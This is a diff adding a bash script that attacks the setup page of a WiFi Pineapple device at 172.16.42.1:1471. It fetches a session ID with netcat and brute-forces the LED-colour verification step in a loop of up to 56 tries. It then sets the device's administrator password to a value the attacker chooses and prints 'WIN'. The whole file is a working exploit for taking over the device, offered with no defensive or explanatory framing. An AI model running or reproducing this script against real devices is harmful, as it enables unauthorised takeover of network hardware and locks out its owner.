@@ -1,0 +1,13 @@
+#!/bin/bash
+post() {
+	len=`printf "$2" | wc -c`
+	printf "POST $1 HTTP/1.1\nHost:172.16.42.1:1471\nContent-Type:application/x-www-form-urlencoded\nCookie:PHPSESSID=$3\nContent-Length:$len\nConnection: close\n\n$2" | nc -w 1 172.16.42.1 1471
+}
+
+
+s1=`printf 'HEAD /?action=verify_pineapple HTTP/1.1\nHost: 172.16.42.1:1471\nConnection: close\n\n' | nc -w 1 172.16.42.1 1471 | egrep -o '[0-9a-z]{32}'`
+
+for try in `seq 1 56` 
+do
+	post "/?action=verify_pineapple" "green=on&amber=on&blue=on&red=on&verify_pineapple=Continue" "$s1" | grep "password" && post "/?action=set_password" "password=pineapplesareyummy&password2=pineapplesareyummy&eula=1&sw_license=1&set_password=Set+Password" "$s1" | grep "success" && password="root" && echo WIN && break;
+done
